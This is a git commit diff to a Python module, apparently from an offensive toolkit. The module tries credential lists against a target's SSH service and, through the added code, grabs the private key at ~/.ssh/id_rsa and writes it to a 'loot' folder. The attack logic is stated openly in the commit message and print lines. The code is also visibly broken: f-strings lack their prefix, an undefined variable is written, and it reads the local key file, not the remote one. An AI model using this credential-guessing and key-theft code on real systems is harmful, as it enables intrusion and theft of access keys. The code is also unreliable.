a580c046ad5e761c2ac867f397fecf4d79108374
Julia Hoang <>
2019-04-28 20:17:20 -0500

    ssh keys saved to loot folder.

--- scripts/ssh.py
+++ scripts/ssh.py
@@ -6,11 +6,11 @@ class SSH(Exploit):
     port = 22
 
     def getloot(self, ip_address, credentials):
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         # try to log into ssh using credentials
         for c in credentials:
             print("Trying to SSH into IP address {ip_address} with:\n username {c[0]} and password {c[1]}")
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             try:
                 ssh.connect(ip_address, username=c[0], password=c[1])
 
@@ -18,14 +18,25 @@ class SSH(Exploit):
                 usernames = get_usernames(ssh)
                 
                 print('Stealing ssh keys.')
-                get_sshkeys(self, ssh)
-                
+                keys = get_sshkeys(self, ssh)
+                ssh.close()
+                if keys: 
+                    with open("../loot/{ip_address}_{c[0]}_sshkey.txt", "w") as text_file:
+	                    text_file.write(text)
                 return usernames
             except:
                 print("Authentication failed.")
+                ssh.close()
+
 
     def get_sshkeys(self, ssh):
-        ssh.exec_command ('cd ~/.ssh')
+        keys = None
+        try:
+            with open(os.path.expanduser('~/.ssh/id_rsa')) as f:
+                keys = f.read().strip()
+        except:
+            print("No SSH keys found.")
+        return keys
 
     def get_usernames(self, ssh):
         ssh.invoke_shell()
@@ -39,5 +50,3 @@ class SSH(Exploit):
 	        if loot not in usernames:
 	            usernames.append(loot)
         return usernames
-
-
